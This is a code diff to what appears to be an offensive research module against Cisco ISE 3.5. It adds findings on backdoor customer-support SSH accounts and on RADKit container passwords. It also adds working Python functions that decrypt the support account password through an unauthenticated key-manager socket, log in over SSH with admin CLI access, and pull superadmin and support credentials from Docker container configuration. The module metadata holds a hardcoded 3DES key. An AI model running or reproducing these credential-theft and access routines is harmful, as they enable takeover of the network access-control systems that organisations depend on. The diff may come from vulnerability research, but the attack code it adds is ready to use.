@@ -84,6 +84,19 @@ ISE-F55: ISE-internal Elasticsearch (port 9200) no auth [NEW in 3.5, MEDIUM]
   cluster: ise-es-cluster; network.host: 0.0.0.0; xpack.security.enabled: false; --network host
   Distinct from MNT-LA (F50/port 9210)
   Source: /media/cowboy/research/ise-re/ise-35/ise35-common-extracted/opt/elasticsearch/ise/config/elasticsearch.yml
+ISE-F56: CUSTOMERSUPPORT backdoor OS accounts — key-manager-recoverable SSH password [HIGH]
+  customersuppadmin (UID 332, gadmin) + customersuppreadonly (UID 333, guser); both SSH-enabled
+  Shell: confdsh.sh -> confd_cli --groups=admin/oper -> full ISE config CLI
+  Shared password stored as CUSTOMERSUPPORT_PWD in db.properties; decrypt via key_manager/decrypt (no auth)
+  Locked (usermod -L) normally; unlocked (usermod -U) by radkit-control.sh during RADKit support sessions
+  Password never expires (chage -M 99999)
+  Source: cpminitialsetup.sh:967-983; radkit-control.sh:277-290; iseperms.sh:201,237-238
+ISE-F57: RADKit Docker container — RADKIT_SERVICE_SUPERADMIN_PASSWORD + CUSTOMER_SUPPORT_PASSWORD passed as base64 env vars [HIGH]
+  docker_create_container --env RADKIT_SERVICE_SUPERADMIN_PASSWORD_BASE64=... --env CUSTOMER_SUPPORT_PASSWORD_BASE64=...
+  docker inspect radkit-service OR /var/lib/docker/containers/<id>/config.v2.json -> base64-decode = plaintext
+  RADKIT_SERVICE_SUPERADMIN_PASSWORD authenticates ISE node to prod.radkit-cloud.cisco.com
+  Docker socket mounted in EDDA (F11) and Hermes (F44) containers -> pivot to extract both creds
+  Source: radkit-control.sh:setup_radkit() docker_create_container invocation
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -3740,10 +3753,115 @@ def trigger_irf_adapter_container(amqp_host: str, adapter_id: str) -> dict:
     return result
 
 
+def recover_customersupport_password_via_key_manager(
+    db_properties_path: str = DB_PROPERTIES_PATH,
+    sock_path: str = KEY_MANAGER_SOCK,
+) -> dict:
+    """ISE-F56: Recover CUSTOMERSUPPORT_PWD from db.properties via key_manager /decrypt."""
+    import re
+    result: dict = {"sock": sock_path, "db_properties": db_properties_path}
+    try:
+        with open(db_properties_path) as f:
+            props = f.read()
+        m = re.search(r"^CUSTOMERSUPPORT_PWD=(.+)$", props, re.MULTILINE)
+        if not m:
+            result["error"] = "CUSTOMERSUPPORT_PWD not found in db.properties"
+            return result
+        ciphertext = m.group(1).strip()
+        result["ciphertext"] = ciphertext
+        import json, socket, http.client
+        class UnixHTTPConnection(http.client.HTTPConnection):
+            def __init__(self, sock_path):
+                super().__init__("localhost")
+                self._sock_path = sock_path
+            def connect(self):
+                self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+                self.sock.connect(self._sock_path)
+        conn = UnixHTTPConnection(sock_path)
+        body = json.dumps({"data": ciphertext}).encode()
+        conn.request("POST", "/api/system/v1/key-manager/decrypt",
+                     body=body, headers={"Content-Type": "application/json"})
+        resp = conn.getresponse()
+        data = json.loads(resp.read())
+        result["plaintext"] = data.get("data", data)
+        result["status"] = "recovered"
+        conn.close()
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
+def ssh_customersuppadmin_confd_cli(host: str, password: str) -> dict:
+    """ISE-F56: SSH as customersuppadmin -> confdsh.sh -> ConfD CLI admin mode.
+    Account must be unlocked (usermod -U active) during RADKit support session.
+    """
+    result: dict = {"host": host, "user": "customersuppadmin"}
+    try:
+        import paramiko
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(host, port=22, username="customersuppadmin", password=password, timeout=10)
+        _, stdout, stderr = client.exec_command("show version", timeout=10)
+        result["output"] = stdout.read().decode()
+        result["stderr"] = stderr.read().decode()
+        result["status"] = "connected"
+        client.close()
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
+def extract_radkit_credentials_via_docker_inspect(container_name: str = "radkit-service") -> dict:
+    """ISE-F57: Extract RADKIT_SERVICE_SUPERADMIN_PASSWORD + CUSTOMER_SUPPORT_PASSWORD
+    from Docker container env vars via docker inspect.
+    Requires Docker socket access (achievable via F11 EDDA or F44 Hermes container pivot).
+    """
+    import subprocess, json, base64
+    result: dict = {"container": container_name}
+    try:
+        out = subprocess.check_output(["docker", "inspect", container_name], timeout=10)
+        data = json.loads(out)
+        env_vars = data[0].get("Config", {}).get("Env", [])
+        for var in env_vars:
+            if var.startswith("RADKIT_SERVICE_SUPERADMIN_PASSWORD_BASE64="):
+                b64 = var.split("=", 1)[1]
+                result["radkit_superadmin_password"] = base64.b64decode(b64).decode().strip()
+            elif var.startswith("CUSTOMER_SUPPORT_PASSWORD_BASE64="):
+                b64 = var.split("=", 1)[1]
+                result["customer_support_password"] = base64.b64decode(b64).decode().strip()
+        result["status"] = "extracted"
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
+def decode_radkit_env_vars(config_json_path: str) -> dict:
+    """ISE-F57: Decode RADKit credentials from Docker config.v2.json on disk.
+    Path: /var/lib/docker/containers/<id>/config.v2.json
+    """
+    import json, base64
+    result: dict = {"path": config_json_path}
+    try:
+        with open(config_json_path) as f:
+            data = json.load(f)
+        env_vars = data.get("Config", {}).get("Env", [])
+        for var in env_vars:
+            if var.startswith("RADKIT_SERVICE_SUPERADMIN_PASSWORD_BASE64="):
+                b64 = var.split("=", 1)[1]
+                result["radkit_superadmin_password"] = base64.b64decode(b64).decode().strip()
+            elif var.startswith("CUSTOMER_SUPPORT_PASSWORD_BASE64="):
+                b64 = var.split("=", 1)[1]
+                result["customer_support_password"] = base64.b64decode(b64).decode().strip()
+        result["status"] = "decoded"
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.25.0",
-    "target": "Cisco ISE 3.3.0.430",
+    "version": "1.26.0",
+    "target": "Cisco ISE 3.5.0.527",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
         "ISE-F6", "ISE-F7", "ISE-F8", "ISE-F9", "ISE-F10",
@@ -3755,17 +3873,18 @@ MODULE_META = {
         "ISE-F39", "ISE-F40", "ISE-F42", "ISE-F43", "ISE-F44",
         "ISE-F45", "ISE-F46", "ISE-F47", "ISE-F48", "ISE-F49",
         "ISE-F50", "ISE-F51", "ISE-F52", "ISE-F53",
+        "ISE-F54", "ISE-F55", "ISE-F56", "ISE-F57",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20",
                  "ISE-F26", "ISE-F31", "ISE-F34", "ISE-F40", "ISE-F49"],
     "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18",
              "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35", "ISE-F36", "ISE-F38",
-             "ISE-F39", "ISE-F44", "ISE-F48"],
+             "ISE-F39", "ISE-F44", "ISE-F48", "ISE-F54", "ISE-F56", "ISE-F57"],
     "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22", "ISE-F24",
                "ISE-F30", "ISE-F33", "ISE-F37", "ISE-F42", "ISE-F45", "ISE-F47",
-               "ISE-F50", "ISE-F51", "ISE-F52"],
+               "ISE-F50", "ISE-F51", "ISE-F52", "ISE-F55"],
     "low": ["ISE-F4", "ISE-F17", "ISE-F25", "ISE-F43", "ISE-F46", "ISE-F53"],
-    "source": "Static RE of Cisco-ISE-3.3.0.430.SPA.x86_64.iso (2026-08-25)",
+    "source": "Static RE of Cisco-ISE-3.5.0.527.SPA.x86_64.iso (2026-08-26)",
     "key_material": {
         "ise_f2_3des_key": "ASDF asdf 1234 8983 jkla",
         "ise_f2_3des_key_hex": "41534446206173646620313233342038393833206a6b6c61",
@@ -4033,5 +4152,9 @@ MODULE_META = {
         "probe_kibana_unauth",
         "probe_grafana_default_creds",
         "probe_node_exporter_metrics",
+        "recover_customersupport_password_via_key_manager",
+        "ssh_customersuppadmin_confd_cli",
+        "extract_radkit_credentials_via_docker_inspect",
+        "decode_radkit_env_vars",
     ],
 }
